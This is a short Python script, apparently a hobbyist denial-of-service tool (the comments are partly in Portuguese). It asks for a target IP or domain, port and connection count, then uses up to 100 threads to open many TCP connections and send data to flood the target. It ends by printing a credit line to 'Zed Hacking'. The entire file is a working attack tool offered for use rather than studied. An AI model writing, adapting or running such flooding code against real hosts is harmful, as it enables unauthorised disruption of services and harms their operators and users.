import socket
import hashlib
import threading
import questionary
import validators
import time

def blackout(ip, port, size, connections, finished_event):
    data = hashlib.sha512(str(size).encode()).hexdigest()
    addr = (ip, port)
    errors = 0
    socks = []
    
    for _ in range(connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect(addr)
            socks.append(sock)
        except socket.error as e:
            errors += 1
            print(f"[-] Error connecting to {ip}:{port}: {e}")
            if len(socks) == 0:
                finished_event.set()  # Sinaliza o término do ataque
                return

    print(f"[*] Launching Blackout attack on {ip}:{port} with {connections} connections...")
    time.sleep(2.5)

    for sock in socks:
        try:
            sock.send(data.encode())
            sock.send('\r\n\r\n'.encode())
            print(f"Attacking {ip}:{port}")
        except socket.error as e:
            errors += 1
            print(f"[-] Error sending data to {ip}:{port}: {e}")

    for sock in socks:
        sock.close()

    print("[*] Blackout attack finished")
    print(f"[-] {errors} Errors")

    finished_event.set()  # Sinaliza o término do ataque

def get_ip_or_domain(ip_or_domain):
    if validators.ipv4(ip_or_domain) or validators.ipv6(ip_or_domain):
        return ip_or_domain
    try:
        ip = socket.gethostbyname(ip_or_domain)
        return ip
    except socket.gaierror:
        raise ValueError(f"Invalid IP address or domain: {ip_or_domain}")

def main():
    print('''
     _____         ____  _       _               
    |  ___|__  _ _| __ )(_) __ _| | ___ _ __ ___ 
    | |_ / _ \| '__|  _ \| |/ _` | |/ _ \ '__/ __|
    |  _| (_) | |  | |_) | | (_| | |  __/ |  \__ \\
    |_|  \___/|_|  |____/|_|\__, |_|\___|_|  |___/
                           |___/                 
    ''')

    example_url = "Example: www.example.com or 93.184.216.34"

    ip_or_domain = questionary.text(f"Enter the target IP address or domain ({example_url}):").ask()
    ip = get_ip_or_domain(ip_or_domain)

    port = questionary.text("Enter the target port (default: 80):").ask()
    port = int(port) if port else 80

    size = questionary.text("Enter the packet size (default: 1024):").ask()
    size = int(size) if size else 1024

    connections = questionary.text("Enter the number of connections (default: 1000):").ask()
    connections = int(connections) if connections else 1000

    num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading

    finished_event = threading.Event()  # Evento para sinalizar o término dos ataques

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads, finished_event))
        threads.append(thread)
        thread.start()

    # Aguarda o término de todos os ataques
    for thread in threads:
        thread.join()

    # Exibe a mensagem de crédito após o término dos ataques
    finished_event.wait()
    print("Créditos para o Zed Hacking pelo script de ataque!")

if __name__ == "__main__":
    main()
            
